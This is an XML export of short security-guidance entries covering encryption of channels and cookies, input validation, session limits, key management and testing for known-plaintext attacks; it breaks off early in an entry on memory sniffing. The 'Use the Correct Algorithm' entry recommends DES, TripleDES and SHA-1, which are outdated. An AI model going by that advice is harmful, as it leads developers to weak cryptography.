<?xml version="1.0"?>
<ArrayOfGuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>399a0935-8990-49fb-b4ab-e04643429dbe</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt the Data or Secure the Communication Channel</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Sensitive Data</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;If you are sending sensitive data over the network to the client, encrypt the data or secure the channel. A common practice is to use SSL between the client and Web server. Between servers, an increasingly common approach is to use
&lt;a class="x_create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.IPSec&amp;amp;return=Home.EncryptDataOrSecureChannel"&gt;
IPSec&lt;/a&gt;. For securing sensitive data that flows through several intermediaries, for example, Web service Simple Object Access Protocol (SOAP) messages, use message level encryption.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>610ea4af-99d3-4077-b1ad-a785a8eb0052</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL to Protect Session Authentication Cookies</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Do not pass authentication cookies over HTTP connections. Set the secure cookie property within authentication cookies, which instructs browsers to send cookies back to the server only over HTTPS connections.
&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>74b457be-5d2c-41ac-84dd-863d465a8511</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Don't Trust User Input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Applications should thoroughly validate all user input before performing operations with that input. The validation may include filtering out special characters. This preventive measure protects the application against accidental misuse or deliberate attacks
 by people who are attempting to inject malicious commands into the system. Common examples include SQL injection attacks, cross-site scripting attacks, and buffer overflow.
&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>913e877c-8add-435b-9a0b-f2aaccb67665</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use the Correct Algorithm and Correct Key Size</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;It is important to make sure you choose the right algorithm for the right job and to make sure you use a key size that provides a sufficient degree of security. Larger key sizes generally increase security. The following list summarizes the major algorithms
 together with the key sizes that each uses: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Data Encryption Standard (DES) 64-bit key (8 bytes) &lt;/li&gt;&lt;li&gt;&lt;a class="x_create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.TripleDES&amp;amp;return=Home.UseCorrectAlgorithm"&gt;TripleDES&lt;/a&gt; 128-bit key or 192-bit key (16 or 24 bytes)
&lt;/li&gt;&lt;li&gt;Rijndael 128-256 bit keys (16-32 bytes) &lt;/li&gt;&lt;li&gt;RSA 384-16,384 bit keys (48-2,048 bytes) &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For large data encryption, use the &lt;a class="x_create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.TripleDES&amp;amp;return=Home.UseCorrectAlgorithm"&gt;
TripleDES&lt;/a&gt; symmetric encryption algorithm. For slower and stronger encryption of large data, use Rijndael. To encrypt data that is to be stored for short periods of time, you can consider using a faster but weaker algorithm such as DES. For digital signatures,
 use Rivest, Shamir, and Adleman (RSA) or Digital Signature Algorithm (DSA). For hashing, use the Secure Hash Algorithm (SHA)1.0. For keyed hashes, use the Hash-based Message Authentication Code (HMAC)
&lt;a class="x_create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.SHA1&amp;amp;return=Home.UseCorrectAlgorithm"&gt;
SHA1&lt;/a&gt;.0.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9d0ec95a-7749-4bb2-9822-bc909b496d20</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Constrain, Reject, and Sanitize Input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;The preferred approach to validating input is to constrain what you allow from the beginning. It is much easier to validate data for known valid types, patterns, and ranges than it is to validate data by looking for known bad characters. When you design
 your application, you know what your application expects. The range of valid data is generally a more finite set than potentially malicious input. However, for defense in depth you may also want to reject known bad input and then sanitize the input.&lt;/p&gt;
&lt;p&gt;To create an effective input validation strategy, be aware of the following approaches and their tradeoffs:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Constrain input. &lt;/li&gt;&lt;li&gt;Validate data for type, length, format, and range. &lt;/li&gt;&lt;li&gt;Reject known bad input. &lt;/li&gt;&lt;li&gt;Sanitize input. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Constrain Input&lt;/h3&gt;
&lt;p&gt;Constraining input is about allowing good data. This is the preferred approach. The idea here is to define a filter of acceptable input by using type, length, format, and range. Define what is acceptable input for your application fields and enforce it.
 Reject everything else as bad data.&lt;/p&gt;
&lt;p&gt;Constraining input may involve setting character sets on the server so that you can establish the canonical form of the input in a localized way.&lt;/p&gt;
&lt;h3&gt;Validate Data for Type, Length, Format, and Range&lt;/h3&gt;
&lt;p&gt;Use strong type checking on input data wherever possible, for example, in the classes used to manipulate and process the input data and in data access routines. For example, use parameterized stored procedures for data access to benefit from strong type
 checking of input fields.&lt;/p&gt;
&lt;p&gt;String fields should also be length checked and in many cases checked for appropriate format. For example, ZIP codes, personal identification numbers, and so on have well defined formats that can be validated using regular expressions. Thorough checking
 is not only good programming practice; it makes it more difficult for an attacker to exploit your code. The attacker may get through your type check, but the length check may make executing his favorite attack more difficult.&lt;/p&gt;
&lt;h3&gt;Reject Known Bad Input&lt;/h3&gt;
&lt;p&gt;Deny &amp;quot;bad&amp;quot; data; although do not rely completely on this approach. This approach is generally less effective than using the &amp;quot;allow&amp;quot; approach described earlier and it is best used in combination. To deny bad data assumes your application knows all the variations
 of malicious input. Remember that there are multiple ways to represent characters. This is another reason why &amp;quot;allow&amp;quot; is the preferred approach.&lt;/p&gt;
&lt;p&gt;While useful for applications that are already deployed and when you cannot afford to make significant changes, the &amp;quot;deny&amp;quot; approach is not as robust as the &amp;quot;allow&amp;quot; approach because bad data, such as patterns that can be used to identify common attacks, do
 not remain constant. Valid data remains constant while the range of bad data may change over time.&lt;/p&gt;
&lt;h3&gt;Sanitize Input&lt;/h3&gt;
&lt;p&gt;Sanitizing is about making potentially malicious data safe. It can be helpful when the range of input that is allowed cannot guarantee that the input is safe. This includes anything from stripping a null from the end of a user-supplied string to escaping
 out values so they are treated as literals.&lt;/p&gt;
&lt;p&gt;Another common example of sanitizing input in Web applications is using URL encoding or HTML encoding to wrap data and treat it as literal text rather than executable script. HtmlEncode methods escape out HTML characters, and UrlEncode methods encode a URL
 so that it is a valid URI request.&lt;/p&gt;
&lt;h3&gt;In Practice&lt;/h3&gt;
&lt;p&gt;The following are examples applied to common input fields, using the preceding approaches:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Last Name field&lt;/strong&gt;. This is a good example where constraining input is appropriate In this case, you might allow string data in the range ASCII A-Z and a-z, and also hyphens and curly apostrophes (curly apostrophes have no significance to
 SQL) to handle names such as O'Dell. You would also limit the length to your longest expected value.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Quantity field&lt;/strong&gt;. This is another case where constraining input works well. In this example, you might use a simple type and range restriction. For example, the input data may need to be a positive integer between 0 and 1000.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Free-text field&lt;/strong&gt;. Examples include comment fields on discussion boards. In this case, you might allow letters and spaces, and also common characters such as apostrophes, commas, and hyphens. The set that is allowed does not include less
 than and greater than signs, brackets, and braces. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Some applications might allow users to mark up their text using a finite set of script characters, such as bold &amp;quot;&amp;lt;b&amp;gt;&amp;quot;, italic &amp;quot;&amp;lt;i&amp;gt;&amp;quot;, or even include a link to their favorite URL. In the case of a URL, your validation should encode the value so that it is
 treated as a URL. &lt;/p&gt;
&lt;p&gt;An existing Web application that does not validate user input. In an ideal scenario, the application checks for acceptable input for each field or entry point. However, if you have an existing Web application that does not validate user input, you need a
 stopgap approach to mitigate risk until you can improve your application's input validation strategy. While neither of the following approaches ensures safe handling of input, because that is dependent on where the input comes from and how it is used in your
 application, they are in practice today as quick fixes for short-term security improvement:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTML-encoding and URL-encoding user input when writing back to the client. In this case, the assumption is that no input is treated as HTML and all output is written back in a protected form. This is sanitization in action.
&lt;/li&gt;&lt;li&gt;Rejecting malicious script characters. This is a case of rejecting known bad input. In this case, a configurable set of malicious characters is used to reject the input. As described earlier, the problem with this approach is that bad data is a matter of
 context. &lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9dbf685d-dd4f-4fe3-8395-f6a24225bf11</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Limit Session Lifetime</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Description&lt;br&gt;
&lt;/h1&gt;
&lt;p&gt;Reduce the lifetime of sessions to mitigate the risk of session hijacking and replay attacks. The shorter the session, the less time an attacker has to capture a session cookie and use it to access your application.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b5ba90be-d6e2-4f37-a75a-ac31315ad990</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Your Administration Interfaces</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Configuration</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</author>
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Description&lt;br&gt;
&lt;/h1&gt;
&lt;p&gt;It is important that configuration management functionality is accessible only by authorized operators and administrators. A key part is to enforce strong authentication over your administration interfaces, for example, by using certificates.&lt;/p&gt;
&lt;p&gt;If possible, limit or avoid the use of remote administration and require administrators to log on locally. If you need to support remote administration, use encrypted channels, for example, with SSL or VPN technology, because of the sensitive nature of the
 data passed over administrative interfaces. Also consider limiting remote administration to computers on the internal network by using
&lt;a class="x_create" title="Click here to create this topic" href="http://www.guidancelibrary.com/wikiedit.aspx?topic=Home.IPSec&amp;amp;return=Home.SecurityYourAdminInterfaces"&gt;
IPSec&lt;/a&gt; policies, to further reduce risk.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c977bdea-a46e-4259-8266-b396efcf83b8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Authentication Cookies</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A stolen authentication cookie is a stolen logon. Protect authentication tickets using encryption and secure communication channels. Also limit the time interval in which an authentication ticket remains valid, to counter the spoofing threat that can result
 from replay attacks, where an attacker captures the cookie and uses it to gain illicit access to your site. Reducing the cookie timeout does not prevent replay attacks but it does limit the amount of time the attacker has to access the site using the stolen
 cookie.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ea26dddc-9b25-4905-82d2-bb72801b6d20</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Your Encryption Keys</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;An encryption key is a secret number used as input to the encryption and decryption processes. For encrypted data to remain secure, the key must be protected. If an attacker compromises the decryption key, your encrypted data is no longer secure.&lt;/p&gt;
&lt;p&gt;The following practices help secure your encryption keys: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use&amp;nbsp;platform provided&amp;nbsp;key management. &lt;/li&gt;&lt;li&gt;Cycle your keys periodically. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Use&amp;nbsp;Platform Provided&amp;nbsp;Key Management&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One of the major advantages of using platform provided key management is that the key management issue is handled by the operating system. For example, if you are using the .NET framework, you can use DPAPI to handle key management. The key that DPAPI uses
 is derived from the password that is associated with the process account that calls the DPAPI functions. You can use DPAPI to pass the burden of key management to the operating system.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cycle Your Keys Periodically&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Generally, a static secret is more likely to be discovered over time. Questions to keep in mind are: Did you write it down somewhere? Did Bob, the administrator with the secrets, change positions in your company or leave the company? Do not overuse keys.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f55158b5-1629-45a3-aa15-f7ed73c2449c</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt the Contents of Authentication Cookies</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Principle</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;Encrypt the cookie contents even if you are using SSL. This prevents an attacker viewing or modifying the cookie if he manages to steal it through an XSS attack. In this event, the attacker could still use the cookie to access your application, but only
 while the cookie remains valid.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>03909323-d17b-4d4e-be83-15eb7cf6733f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Known Plaintext Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Public and private key encryption systems.&lt;strong&gt;&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;In known plaintext attacks the adversary knows both the plaintext and its equivalent ciphertext, and then uses both to calculate a secret cryptographic variable such as the encryption key.&amp;nbsp;&amp;nbsp; Known plaintext bugs are simple to exploit as the attacker doesn’t
 need to force the victim into encrypting any particular chosen plaintext.&lt;/p&gt;
&lt;p&gt;The following steps are recommended to test for known plaintext bugs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Root Causes and Mitigations&lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Tune Test Cases&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenario &lt;/h1&gt;
&lt;p&gt;First, you need to understand the details of known plaintext attacks.&amp;nbsp; In the common known plaintext attack scenario the adversary’s goal is to recover the encryption key.&amp;nbsp; The scenario starts with the attacker selecting the victim and discovering the plaintext
 that the victim encrypts.&amp;nbsp; The attacker then waits until the victim encrypts the plaintext and observes the resulting ciphertext.&amp;nbsp; Then, the attacker uses both the plaintext and ciphertext to recover the encryption key that satisfies the next equation:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;C = E(K, P)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Where &lt;em&gt;E &lt;/em&gt;stands for the encryption routine that converts plaintext &lt;em&gt;
P&lt;/em&gt; in to ciphertext &lt;em&gt;C&lt;/em&gt; using the encryption key&lt;em&gt; K.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If the adversary is able to compute the encryption key, he can use it to decrypt an unknown ciphertext, as the following equation demonstrates:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Pu&lt;/em&gt;&lt;em&gt;&amp;nbsp;= D(K, Ck)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Where &lt;em&gt;D &lt;/em&gt;stands for the decryption routine that converts a known ciphertext
&lt;em&gt;Ck &lt;/em&gt;to the unknown plaintext &lt;em&gt;Pu&lt;/em&gt; to using the encryption key&lt;em&gt; K.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The adversary is able to decrypt any ciphertext created using the stolen key, including potentially sensitive data such as passwords and credit card numbers.&lt;em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Step 2:&amp;nbsp; Analyze Root Cause and Mitigations&lt;/h2&gt;
&lt;p&gt;As the section’s name indicates, the success of plaintext attacks depends on &lt;em&gt;
knowing&lt;/em&gt; the plaintext that is encrypted.&amp;nbsp; It may seem improbable that an adversary gains knowledge of any plaintext; yet nonetheless there are some circumstances where this can happen.&amp;nbsp; For instance, if the victim is out of the office and has an auto-reply
 email message configured; the attacker may very well know what the message looks like before it’s encrypted.&amp;nbsp; Another common example is where the victim sends an email to a group of people including the attacker.&amp;nbsp; The attacker can then read the plaintext sent
 to him, and the ciphertext sent to everybody else.&amp;nbsp; &amp;nbsp;&lt;/p&gt;
&lt;p&gt;An additional attack might consist of the attacker sniffing an email conversation between two people exchanging an encrypted document as part of a review process.&amp;nbsp; When the document is published the attacker can compare the plaintext publication with the
 latest version of the encrypted file.&amp;nbsp; &amp;nbsp;&lt;em&gt;Partially known&lt;/em&gt; plaintext attacks occur when the adversary knows part of the plaintext such as headers of IP packets, the beginning of emails, etc.&amp;nbsp; There are different ways for an adversary to know the plaintext
 in use - a root cause for this vulnerability is any situation which allows the adversary to be aware of such plaintext.&lt;/p&gt;
&lt;p&gt;There are no clear mitigations against these attacks as most of the causes happen by design.&amp;nbsp; For instance, email servers provide the functionality to have auto-reply messages.&amp;nbsp; Furthermore, in the case where the victim sends the attacker a copy of a group
 email, there is no way to prevent the victim from emailing the attacker if the attacker is part of the group.&amp;nbsp; Consider the case where the attacker sniffs an encrypted document in review: possible mitigations for this attack require higher level analysis and
 education, such as requiring the people involved in the document review to check the document in to an Intranet portal or similar mechanism rather than transferring it back and forth via email.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/h1&gt;
&lt;p&gt;Now that you’ve learned what known plaintext attacks look like and the reasons why they exist, you must test for both secure and insecure implementations.&lt;/p&gt;
&lt;p&gt;The basic known plaintext security testing follows these steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Select the victim.&lt;/li&gt;&lt;li&gt;Read plaintext before the victim encrypts it.&lt;/li&gt;&lt;li&gt;Read the ciphertext after the victim encrypts it.&lt;/li&gt;&lt;li&gt;Use the plaintext and ciphertext to calculate the encryption key.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;em&gt;Expected result:&lt;/em&gt;&amp;nbsp; The system protects against reading the plaintext before it is encrypted in step 2.&amp;nbsp; The test fails if you can execute step 2.&lt;/p&gt;
&lt;p&gt;It is important that during this step you explore the encryption routine used by the system under test.&amp;nbsp; For example, you can check the size of the data before and after encryption.&amp;nbsp; If the encryption routine doesn’t modify the data size then the plaintext
 and ciphertext have the same size.&amp;nbsp; You can later compare the sizes as a preliminary check to see if the ciphertext matches the known plaintext.
&lt;/p&gt;
&lt;p&gt;Another way to test for known plaintext bugs is to become a valid user of the encryption system.&amp;nbsp; For instance, picture a system that has multiple clients and uses a different key to talk to each client.&amp;nbsp; After becoming a valid client, you can configure
 a network monitor to see how the server application communicates with you.&amp;nbsp; In most cases, server applications use the same protocol to talk to multiple clients, so parts of the network packets (such as headers) will be constant.&amp;nbsp; You can read these headers
 in plaintext as they arrive to you or as ciphertext as they arrive to each client, and use this pair of collected data to execute an attack on a client’s private key.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Tune Test Cases&lt;/h1&gt;
&lt;p&gt;Like any vulnerability, the amount of testing for known plaintext attacks depends on their risk.&amp;nbsp; In some cases they represent no obvious risk; the time to compute the key using any known cryptanalysis in systems using large keys and a trusted encryption
 algorithm may be too great to represent a high risk.&amp;nbsp; However, some systems are mission critical, hermetic, or self contained, and in such cases any possible knowledge of the plaintext before it is encrypted can pose a high risk.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;You must also decide what your attack goals are before testing.&amp;nbsp; Make sure to define the attack’s goal in each test case (such as breaking a client’s key, the server’s key, or both.)&amp;nbsp; Some keys are more critical to the security of the system under test than
 others, and you can use this fact to tune your test cases.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Known plaintext attacks are cryptographic attacks in which the adversary knows the plaintext before it is encrypted.&amp;nbsp; The goal of the attack is to calculate the encryption key to gather additional sensitive data.&amp;nbsp; To test for these attacks, you need to understand
 their attack scenarios as well as their root causes and mitigations.&amp;nbsp; Then, start testing from the ground up, such as checking message data lengths, and then additional approaches should be used such as becoming a legitimate client of the system and analyzing
 the format of the encrypted text that is being transmitted.&amp;nbsp; Make sure to tune your test cases based on the sensitivity of the particular encryption key, and the risk potential of an attacker stealing it.&lt;strong&gt;&lt;span style="text-decoration:underline"&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>34a67410-3d1c-4e98-886a-bbb2be1b71dc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Memory Sniffing Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Information Disclosure</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;All software applications &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Applications must store sensitive data such as passwords or cryptographic values in system memory in order to properly operate. However, secrets may be stored in memory that is accessible to an attacker or swapped out of memory and into swaps files. During
 this attack, the attacker sniffs the different types of memory available, including random access memory (RAM), virtual memory, dump files, and swap files in an attempt to recover sensitive information such as passwords or cryptographic keys.&lt;/p&gt;
&lt;p&gt;It is recommended that you follow these steps in order to test for this bug:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1: Understand attack scenarios &lt;/li&gt;&lt;li&gt;Step 2: Analyze causes and countermeasures &lt;/li&gt;&lt;li&gt;Step 3: Start testing and exploring &lt;/li&gt;&lt;li&gt;Step 4: Execute additional testing&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 1: Understand attack scenarios&lt;/h1&gt;
&lt;p&gt;First, it is necessary to properly understand the types of temporary memory related to this vulnerability:&lt;/p&gt;
&lt;ul&gt;
